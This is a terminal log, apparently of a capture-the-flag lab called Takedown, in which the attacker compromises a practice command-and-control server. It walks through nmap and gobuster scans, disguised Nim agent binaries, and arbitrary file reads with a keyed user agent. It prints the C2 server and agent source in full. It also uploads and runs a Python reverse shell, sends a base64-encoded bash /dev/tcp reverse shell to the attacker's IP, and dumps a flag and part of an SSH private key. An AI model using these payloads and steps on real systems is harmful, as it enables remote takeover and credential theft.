
![image](https://github.com/user-attachments/assets/79a2592d-1359-4034-8205-b92687e98e8f)


root@ip-10-10-11-235:~# nmap takedown.thm.local -T5
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-24 03:34 BST
Nmap scan report for takedown.thm.local (10.10.226.13)
Host is up (0.0044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:72:59:3A:4C:81 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds


root@ip-10-10-11-235:~# gobuster dir -e -k -u http://takedown.thm.local -w /usr/share/wordlists/dirb/common.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://takedown.thm.local
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://takedown.thm.local/.htpasswd            (Status: 403) [Size: 283]
http://takedown.thm.local/.hta                 (Status: 403) [Size: 283]
http://takedown.thm.local/.htaccess            (Status: 403) [Size: 283]
http://takedown.thm.local/css                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/css/]
http://takedown.thm.local/fonts                (Status: 301) [Size: 324] [--> http://takedown.thm.local/fonts/]
http://takedown.thm.local/images               (Status: 301) [Size: 325] [--> http://takedown.thm.local/images/]
http://takedown.thm.local/index.html           (Status: 200) [Size: 25844]
http://takedown.thm.local/inc                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/inc/]
http://takedown.thm.local/js                   (Status: 301) [Size: 321] [--> http://takedown.thm.local/js/]
http://takedown.thm.local/favicon.ico          (Status: 200) [Size: 605010]
http://takedown.thm.local/robots.txt           (Status: 200) [Size: 36]
http://takedown.thm.local/server-status        (Status: 403) [Size: 283]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================


root@ip-10-10-11-235:~# curl http://takedown.thm.local/robots.txt
User-agent: *
Disallow: /favicon.icon

root@ip-10-10-11-235:~# wget http://takedown.thm.local/favicon.ico


root@ip-10-10-11-235:~# wget http://takedown.thm.local/images/shutterbug.jpg



root@ip-10-10-11-235:~# file favicon.ico
favicon.ico: PE32+ executable (GUI) x86-64, for MS Windows
root@ip-10-10-11-235:~# file shutterbug.jpg
shutterbug.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 1050x700, components 3
root@ip-10-10-11-235:~# sha256sum favicon.ico
80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc  favicon.ico
root@ip-10-10-11-235:~# sha256sum shutterbug.jpg
0a6583131935af7ad7b527d86af6372c4ca9d7ff74f55a3f25a3d1c2a41e891f  shutterbug.jpg



oot@ip-10-10-11-235:~# strings favicon.ico | grep nim
fatal.nim
io.nim
fatal.nim
parseutils.nim
strutils.nim
@strutils.nim(739, 11) `sep.len > 0` 
oserr.nim
os.nim
@iterators.nim(258, 11) `len(a) == L` the length of the string changed while iterating over it
streams.nim
...
net.nim
...
tables.nim
@hashcommon.nim(29, 9) `
httpclient.nim
@tables.nim(1144, 13) `len(t) == L` the length of the table changed while iterating over it
@iterators.nim(240, 11) `len(a) == L` the length of the seq changed while iterating over it
@iterators.nim(249, 11) `len(a) == L` the length of the seq changed while iterating over it
@iterators.nim(173, 11) `len(a) == L` the length of the seq changed while iterating over it
@iterators.nim(258, 11) `len(a) == L` the length of the string changed while iterating over it
@iterators.nim(240, 11) `len(a) == L` the length of the seq changed while iterating over it
@hashcommon.nim(29, 9) `
options.nim
backend.nim
@httpclient.nim(1144, 15) `false` 
@httpclient.nim(1082, 13) `not url.contains({'\r', '\n'})` url shouldn't contain any newline characters
@random.nim(325, 10) `x.a <= x.b` 
@iterators.nim(240, 11) `len(a) == L` the length of the seq changed while iterating over it
stdlib_io.nim.c
stdlib_math.nim.c
stdlib_times.nim.c
stdlib_os.nim.c
stdlib_net.nim.c
stdlib_uri.nim.c
stdlib_json.nim.c
@mmain.nim.c
nimSubInt
stdlib_digitsutils.nim.c
stdlib_assertions.nim.c
stdlib_formatfloat.nim.c
stdlib_dollars.nim.c
nimAddInt
stdlib_widestrs.nim.c
nimToCStringConv
nimZeroMem
nimGC_setStackBottom
nimGCunrefNoCycle
nimGCvisit
nimRegisterThreadLocalMarker
nimLoadLibrary
nimLoadLibraryError
nimGetProcAddr
nimRegisterGlobalMarker
nimLeaveFinally
nimNewSeqOfCap
nimCharToStr
nimBoolToStr
stdlib_system.nim.c
nimAddInt64
nimSubInt64
stdlib_parseutils.nim.c
nimMulInt
stdlib_strutils.nim.c
stdlib_dynlib.nim.c
stdlib_winlean.nim.c
stdlib_options.nim.c
nimDivInt64
nimMulInt64
stdlib_win_setenv.nim.c
nimAddInt.constprop.0
stdlib_hashes.nim.c
stdlib_streams.nim.c
stdlib_osproc.nim.c
stdlib_nativesockets.nim.c
stdlib_monotimes.nim.c
stdlib_base64.nim.c
stdlib_sysrand.nim.c
stdlib_random.nim.c
stdlib_httpcore.nim.c
stdlib_asyncfutures.nim.c
stdlib_asyncdispatch.nim.c
stdlib_httpclient.nim.c
none__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_537
some__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_559
advance__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_511
newParseState__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_586
consume__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_692
@m..@s..@s..@s..@s.nimble@spkgs@sargparse-3.0.0@sargparse@sbackend.nim.c
.rdata$.refptr.ARGPARSE_STDOUT__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_74
.rdata$.refptr.nim_program_result
NTIprocLs58stream_buffer58pointer_buflen58intT58intLOnimcall_gcsafeOT__2VVzVL9bOnKhj1eZKkf9cEuA_
NTIprocLs58stream_buffer58pointer_buflen58intTLOnimcall_gcsafeOT__ki6p1QyfOkJLQJ9aw5NI0AQ_
NTIprocLs58streamTLOnimcall_gcsafeOT__JQrsH08b4uPTH9cyFPlVOZg_
NTIprocLs58stream_buffer58varstring_slice58sliceLsystemOintTT58intLOnimcall_gcsafeOT__c9c0f59ak4YGQ6neEym8LPKw_
NTIprocLs58stream_pos58intTLOnimcall_gcsafeOT__3svSoGIUJIsHkaBL7q4DAQ_
NTIprocLs58streamT58boolLOnimcall_gcsafeOT__9bmhFrLahRsL2hltfRDVtlQ_
.refptr.ARGPARSE_STDOUT__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_74
.refptr.nim_program_result
NTIprocLs58streamT58intLOnimcall_gcsafeOT__xflqkf2D1uVClg70czEDHA_
nim_program_result
ARGPARSE_STDOUT__OOZOOZOOZOOZOnimbleZpkgsZargparse4551O48O48ZargparseZbackend_74
NTIprocLs58stream_line58varstringT58boolLOnimcall_gcsafeOT__7jFfqMk9ajToCz6Hv9atCA4A_
root@ip-10-10-11-235:~# 

root@ip-10-10-11-235:~# curl http://takedown.thm.local/image/shutterbug.jpg.bak
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at takedown.thm.local Port 80</address>
</body></html>



root@ip-10-10-11-235:~# apt install cutter


![image](https://github.com/user-attachments/assets/b33de20e-1108-49e7-8d4d-502bdaa21a2c)

![image](https://github.com/user-attachments/assets/39b408fe-fcd4-48c1-8f5c-503d893619a8)


root@ip-10-10-11-235:~# pip install html2text

root@ip-10-10-11-235:~# curl http://takedown.thm.local/image/ | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   280  100   280    0     0  14000      0 --:--:-- --:--:-- --:--:-- 14000
# Not Found

The requested URL was not found on this server.

* * *

Apache/2.4.52 (Ubuntu) Server at takedown.thm.local Port 80

root@ip-10-10-11-235:~# file shutterbug.jpg.bak
shutterbug.jpg.bak: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e3c7f037a52f26b1982f131013708f59786d773, for GNU/Linux 3.2.0, not stripped
root@ip-10-10-11-235:~# chmod +x shutterbug.jpg.bak
root@ip-10-10-11-235:~# ./shutterbug.jpg.bak
\U0001f97a\U0001f97a\U0001f622\U0001f622\U0001f622\U0001f62d\U0001f62d\U0001f62d\U0001f602\U0001f602\U0001f923\U0001f923
root@ip-10-10-11-235:~# ./shutterbug.jpg.bak -h
\U0001f602\U0001f40d\U0001f680\U0001f680\U0001f92b\U0001f387\U0001f387\U0001f386\U0001f64f\U0001f525\u2764\ufe0f\u200d\U0001f525\U0001f496\U0001f4af\U0001f44b\U0001f44b\U0001f44b\U0001f4af\u2764\ufe0f\u200d\U0001f525\U0001f496\U0001f525\U0001f525\U0001f525\u2764\ufe0f\u200d\U0001f525\U0001f92b\U0001f387\U0001f387\U0001f386\U0001f386\U0001f680\U0001f346

Usage:
   [options] 

Options:
  -h, --help
  -v, --ver

root@ip-10-10-11-235:~# 


![image](https://github.com/user-attachments/assets/5d8886c9-8b19-4957-9241-4e94ae2aa4b2)



![image](https://github.com/user-attachments/assets/1d2b45fe-d767-4960-a800-3e85aae6fd90)


root@ip-10-10-11-235:~# strings shutterbug.jpg.bak | grep takedown
@http://takedown.thm.local/
@http://takedown.thm.local/api/agents/register
ShortCircuit on Unknown argumenthttp://takedown.thm.local/api/ag[*] Ready to rec from C2 server
root@ip-10-10-11-235:~# grep "api" shutterbug.jpg.bak
Binary file shutterbug.jpg.bak matches
root@ip-10-10-11-235:~# strings shutterbug.jpg.bak | grep api
/api/ageI
/api/ageI
/api/age
/api/age
@http://takedown.thm.local/api/agents/register
ShortCircuit on Unknown argumenthttp://takedown.thm.local/api/ag[*] Ready to rec from C2 server
gHeapidGenerator__system_5479
root@ip-10-10-11-235:~# sudo useradd -m c.oberst
root@ip-10-10-11-235:~# sudo su c.oberst

![image](https://github.com/user-attachments/assets/9b04e7fc-f167-448f-83f5-2339d53ea1bb)

![image](https://github.com/user-attachments/assets/59b204f5-a9ef-4d8d-8ff4-cd3cd0aa7810)

root@ip-10-10-11-235:~# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local
.root@ip-10-10-11-235:~# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
{'jytj-tdgr-hgbh-ptlx': 'www-infinity', 'liyk-ffcr-pppp-whny': 'ip-10-10-11-235'}root@ip-10-10-11-235:~# gobuster dir --url=http://takedown.thm.local/api --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" --exclude-length 1
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://takedown.thm.local/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          1
[+] User Agent:              Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server               (Status: 200) [Size: 71]
/agents               (Status: 200) [Size: 81]
Progress: 34342 / 218276 (15.73%)^C


root@ip-10-10-11-235:~# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/server
{"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}

root@ip-10-10-11-235:~# curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
{'jytj-tdgr-hgbh-ptlx': 'www-infinity', 'liyk-ffcr-pppp-whny': 'ip-10-10-11-235'}

root@ip-10-10-11-235:~# curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/jytj-tdgr-hgbh-ptlx/upload -H "Content-Type: application/json" -d '{"file":"/etc/passwd"}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

![image](https://github.com/user-attachments/assets/e26a0dd1-299d-4464-8c19-f3a3ead96dd3)

![image](https://github.com/user-attachments/assets/3925e6b6-30a8-4814-8504-e67eade337b5)

![image](https://github.com/user-attachments/assets/d2384404-c887-4544-8439-0f3880c2570b)

root@ip-10-10-11-235:~# curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/jytj-tdgr-hgbh-ptlx/upload -H "Content-Type: application/json" -d '{"file":"app.py"}'
import logging
import sys
import json
from threading import Thread
import re
import random
from os import system

import flask
from flask import request, abort
from flask_cors import CORS

HEADER_KEY = "z.5.x.2.l.8.y.5"

command_list = []
command_to_execute_next = ""
command_stack_reset_flag = False
agg_commands = open('aggressor.txt', 'r')
lines = agg_commands.readlines()
for line in lines:
    command_list.append(line.strip())

available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]

live_agents = {}

app = flask.Flask(__name__)
app.secret_key = "000011112222333344445555666677778888"

logging.basicConfig(filename='teamserver.log', level=logging.DEBUG)


def is_user_agent_keyed(user_agent):
    return HEADER_KEY in user_agent


def json_response(app, data):
    try:
        return app.response_class(
            response=json.dumps(data),
            status=200,
            mimetype='application/json'
        )
    except Exception as e:
        return str(e)


def is_command_reset_flag_set(command_stack_reset_flag):
    return command_stack_reset_flag


@app.route("/")
def hello_world():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return "."
    else:
        abort(404)


@app.route('/api/server', methods=['GET'])
def get_server_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        server_info = {"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}
        return json_response(app, server_info)
    else:
        abort(404)

@app.route('/api/agents', methods=['GET'])
def get_agent_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if live_agents:
            return str(live_agents), 200
        else:
            return "No live agents", 200
    else:
        abort(404)


@app.route(f'/api/agents/commands', methods=['GET'])
def get_agent_commands():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return f"Available Commands: {available_commands}", 200
    else:
        abort(404)


@app.route('/api/agents/register', methods=['POST'])
def post_register_agent():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            try:
                uid = request.json["uid"]
                hostname = request.json["hostname"]
                live_agents[uid] = hostname
                msg = f"New agent UID: {uid} on host {hostname}"
                app.logger.debug(msg)
                print(msg)
                return msg, 200
            except Exception as e:
                return str(e), 500
        return "MESSAGE: {0}".format(request.is_json)
    else:
        abort(404)


@app.route('/api/agents/<uid>', methods=['GET'])
def get_agent(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            info = live_agents.get(uid)
            return f"Agent info:\nUID: {uid} - Hostname: {info}", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route('/api/agents/<uid>/command', methods=['GET', 'POST'])
def get_agent_command(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                global command_to_execute_next
                global command_stack_reset_flag
                if command_to_execute_next:
                    command_reset_flag = is_command_reset_flag_set(command_stack_reset_flag)
                    if command_reset_flag:
                        command = random.choice(command_list)
                        return f"{command}", 200
                    else:
                        command = command_to_execute_next
                        command_stack_reset_flag = True
                        return f"{command}", 200
                else:
                    command = random.choice(command_list)
                    return f"{command}", 200
            if request.json:
                result = request.json["results"]
                app.logger.debug(result)
                print(result)
                return "OK", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/upload', methods=['POST'])
def post_upload(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                f = open(file,"rb")
                data = f.read()
                f.close()
                return data, 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/download', methods=['POST'])
def post_download(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                if file in ["app.py", "aggressor.txt"]:
                    abort(404)
                data = request.json["data"]
                f = open(file ,"w")
                f.write(data)
                f.close()
                return "OK", 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/server/exec', methods=['POST'])
def post_server_exec():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            cmd = request.json['cmd']
            res = system(f"{cmd}")
            return f"Command: {cmd} - Result code: {res}", 200
        else:
            return "Bad request", 400
    else:
        abort(404)


@app.route('/api/agents/<uid>/exec', methods=['GET', 'POST'])
def post_agent_exec(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                return f"EXEC: {uid}", 200
            if request.method == 'POST':
                if request.json:
                    global command_to_execute_next
                    command_to_execute_next = request.json["cmd"]
                    global command_stack_reset_flag
                    command_stack_reset_flag = False
                    msg = f"New commnad to execute: {command_to_execute_next}"
                    app.logger.debug(msg)
                    print(msg)
                    return msg, 200
                else:
                    return "Bad request", 400
            else:
                abort(404)
        else:
            abort(404)
    else:
        abort(404)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return flask.render_template("index.html")
    else:
        abort(404)


CORS(app, resources={r"/*": {"origins": "*"}})


if __name__=="__main__":
    app.run(host="0.0.0.0", port=8000)

root@ip-10-10-11-235:~# 

root@ip-10-10-11-235:~# curl -X POST -A "z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/jytj-tdgr-hgbh-ptlx/download -H "Content-Type: application/json" -d '{"file": "revshell.py","data": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.11.234\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"}'
OK

curl -X POST -A "z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/jytj-tdgr-hgbh-ptlx/download -H "Content-Type: application/json" -d '{"file": "revshell.py","data": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.49.180\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"}'

root@ip-10-10-49-180:~# curl -X POST -A "z.5.x.2.l.8.y.5" http://takedown.thm.local/api/server/exec -H "Content-Type: application/json" -d '{"cmd": "python3 revshell.py"}'

![image](https://github.com/user-attachments/assets/148c263e-1d64-41d3-a17f-fa6e49f26259)


# whoami
root
# ls
Dockerfile
agent
aggressor.txt
app.py
bar.txt
favicon.ico
requirements.txt
revshell.py
teamserver.log
templates
# hostname
c2-shrike-1
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@c2-shrike-1:/home#  ls
ls
bin   dev  home  lib64	mnt  proc	    root  sbin	sys  usr
boot  etc  lib	 media	opt  python-docker  run   srv	tmp  var
root@c2-shrike-1:/# cd python-docker
cd python-docker
root@c2-shrike-1:/python-docker# cat aggressor.txt
cat aggressor.txt
whoami
id
pwd
hostname
upload bar.txt foo.txtroot@c2-shrike-1:/python-docker# 


root@c2-shrike-1:/python-docker/agent# ls
ls
commands  favicon.ico  main.nim  shutterbug.jpg.bak  svcgh0st
root@c2-shrike-1:/python-docker/agent# cat main.nim
cat main.nim
#[
    C2 Agent Emulator
    Built for Takedown THM box

    Compile for dev:
        nim c --run main.nim -v

    Compile for release:
        Windows [favicon.ico]
            nim c --d:mingw --d:release --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --app=gui -d:strip --cpu=amd64 -o:favicon.ico main.nim
        Linux [shutterbug.jpg.bak]
            nim c --d:release --deadCodeElim:on --opt:speed --stackTrace:off --lineTrace:off -d:strip --cpu=amd64 -o:shutterbug.jpg.bak main.nim
        Linux [webserver-RAT]
            nim c --d:release --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off -d:strip --cpu=amd64 -o:svcgh0st main.nim
            Ensure keyed username and teamserver IP are changed
]#
from os import sleep
import osproc
import std/[httpclient, json]
import sequtils, random
from strutils import join, strip
include commands/[whoami, id, upload, pwd, download, exec, get_hostname]
import argparse
from nativesockets import getHostName
#import strenc

randomize()

# TESTING VARS
# var api_server = "http://localhost:8000/"
# const keyed_username = "husky"



const lowerCaseAscii = 97..122
const sleep_interval = 10000
const keyed_username = "c.oberst"
const api_server = "http://takedown.thm.local/"

# WEBSERVER vars
# const keyed_username = "webadmin-lowpriv"
# const api_server = "http://localhost:8888/"



# Argparse. Oh hey, there's a -v for ver mode! That's handy
var p = newParser:
    help("\U0001f602\U0001f40d\U0001f680\U0001f680\U0001f92b\U0001f387\U0001f387\U0001f386\U0001f64f\U0001f525\u2764\ufe0f\u200d\U0001f525\U0001f496\U0001f4af\U0001f44b\U0001f44b\U0001f44b\U0001f4af\u2764\ufe0f\u200d\U0001f525\U0001f496\U0001f525\U0001f525\U0001f525\u2764\ufe0f\u200d\U0001f525\U0001f92b\U0001f387\U0001f387\U0001f386\U0001f386\U0001f680\U0001f346")
    flag("-v", "--ver", help="")

var uid: string = ""

proc rand_str: string =
    4.newSeqWith(lowerCaseAscii.rand.char).join & "-" & 4.newSeqWith(lowerCaseAscii.rand.char).join & "-" & 4.newSeqWith(lowerCaseAscii.rand.char).join & "-" & 4.newSeqWith(lowerCaseAscii.rand.char).join    


# Server says: if the host headers do not contain [values], no soup for you! So let's include those pre-set values
const keyed_header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5"

# Check if the username of the user  is a specified value. If it is, run the agent. If not, nothing.
proc wake_up(key: string): bool =
    var res = strip(whoami())
    return key in res

# Initial check in and registration with server
proc initial_check_in(hostname: string): string =    
    # Create agent unique ID and POST to /api/agents/
    var uid = rand_str()
    
    try:
        var client = newHttpClient(userAgent = keyed_header)
        client.headers = newHttpHeaders({ "Content-Type": "application/json" })
        var body = %*{
            "uid": uid,
            "hostname": hostname
        }
        discard(client.request(api_server & "api/agents/register", httpMethod = HttpPost, body = $body))
    except:
        echo "\U0001f923"
        quit(1)
    uid
    

# Check in with server and ask for commands
proc check_for_commands(): string =
    var client = newHttpClient(userAgent = keyed_header)
    let command_api = api_server & "api/agents/" & uid & "/command"
    let response = client.request(command_api, httpMethod = HttpGet)
    response.body

# Command handlers
proc command_handler(cmd: string): string =
    var split_cmd = cmd.split(" ")
    var run_cmd = split_cmd[0].strip()
    try:
        case run_cmd:
            of "whoami":
                result = whoami()
            of "exec":
                result = exec(cmd)
            of "id":
                result = id()
            of "upload":
                result = upload(split_cmd, uid, keyed_header, api_server)
            of "pwd":
                result = pwd()
            of "download":
                result = download(split_cmd, uid, keyed_header, api_server)
            of "get_hostname":
                result = get_hostname()
        return result
    except Exception as e:
        return "[x] Error: " & e.msg


# Send the results from a command
proc send_results(command_result: string): void =
    var client = newHttpClient(userAgent = keyed_header)
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    var body = %*{
                "results": command_result
        } 
    discard(client.request(api_server & "api/agents/" & uid & "/command", httpMethod = HttpPost, body = $body))



# Main
when isMainModule:
    try:
        let opts = p.parse()
        
        if opts.ver:
            echo "[*] Drone ready!"
        
        if opts.ver:
            echo "[*] Checking keyed username..."
        var is_keyed = wake_up(keyed_username)


        if not is_keyed:
            echo "\U0001f97a\U0001f97a\U0001f622\U0001f622\U0001f622\U0001f62d\U0001f62d\U0001f62d\U0001f602\U0001f602\U0001f923\U0001f923"
            quit()
        else:
            if opts.ver:
                echo "[*] Key matches!"
            
            var hostname = getHostName()
            uid = initial_check_in(hostname)
            
            if opts.ver:
                echo "[*] My UID is: " & uid
                echo "[*] Hostname: " & hostname
            
            # Command loop
            while true:
                if opts.ver:
                    echo "[*] Checking for command..."
                
                var command = check_for_commands()
                if opts.ver:
                    echo "[*] Command to run: " & command
                
                var res = command_handler(command)
                if opts.ver:
                    echo "[*] Result: " & strip(res)
                
                send_results(strip(res))
                
                if opts.ver:
                    echo "[*] Sleeping: " & $sleep_interval
                sleep(sleep_interval)
    
    except ShortCircuit as e:
            if e.flag == "argparse_help":
                echo p.help
                quit(1)
    
    except UsageError:
        stderr.writeLine getCurrentExceptionMsg()
        quit(1)
        root@c2-shrike-1:/python-docker/agent# 

        

bash -i >& /dev/tcp/10.10.49.180/8888 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC40OS4xODAvODg4OCAwPiYx

![image](https://github.com/user-attachments/assets/8719b45f-8532-4a09-bb84-b47a1218b8cd)


root@ip-10-10-49-180:~# curl -X POST -A "z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/jytj-tdgr-hgbh-ptlx/exec -H "Content-Type: application/json" -d '{"cmd": "exec echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC40OS4xODAvODg4OCAwPiYx | base64 -d | bash"}'
New commnad to execute: exec echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC40OS4xODAvODg4OCAwPiYx | base64 -d | bash
root@ip-10-10-49-180:~#


root@ip-10-10-49-180:~# nc -nlvp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.226.13 58620
bash: cannot set terminal process group (1852): Inappropriate ioctl for device
bash: no job control in this shell
webadmin-lowpriv@www-infinity:~$ ls
ls
foo.txt
user.txt
webadmin-lowpriv@www-infinity:~$ cat user.txt
cat user.txt
THM{c2_servers_have_vulnerabilities_t00}
webadmin-lowpriv@www-infinity:~$ cd /root
cd /root
bash: cd: /root: Permission denied
webadmin-lowpriv@www-infinity:~$ ls -lah
ls -lah
total 44K
drwxr-xr-x 5 webadmin-lowpriv webadmin-lowpriv 4.0K Jul 27  2022 .
drwxr-xr-x 4 root             root             4.0K Jul 27  2022 ..
-rw------- 1 webadmin-lowpriv webadmin-lowpriv    5 Jul 27  2022 .bash_history
-rw-r--r-- 1 webadmin-lowpriv webadmin-lowpriv  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webadmin-lowpriv webadmin-lowpriv 3.7K Feb 25  2020 .bashrc
drwx------ 2 webadmin-lowpriv webadmin-lowpriv 4.0K Jul 27  2022 .cache
drwxrwxr-x 3 webadmin-lowpriv webadmin-lowpriv 4.0K Jul 27  2022 .local
-rw-r--r-- 1 webadmin-lowpriv webadmin-lowpriv  807 Feb 25  2020 .profile
drwx------ 2 webadmin-lowpriv webadmin-lowpriv 4.0K Jul 27  2022 .ssh
-rw-r--r-- 1 webadmin-lowpriv webadmin-lowpriv  447 Jun 24 04:21 foo.txt
-rw-rw-r-- 1 webadmin-lowpriv webadmin-lowpriv   41 Jul 27  2022 user.txt
webadmin-lowpriv@www-infinity:~$ cd .ssh
cd .ssh
webadmin-lowpriv@www-infinity:~/.ssh$ ls
ls
authorized_keys
id_rsa
id_rsa.pub
webadmin-lowpriv@www-infinity:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
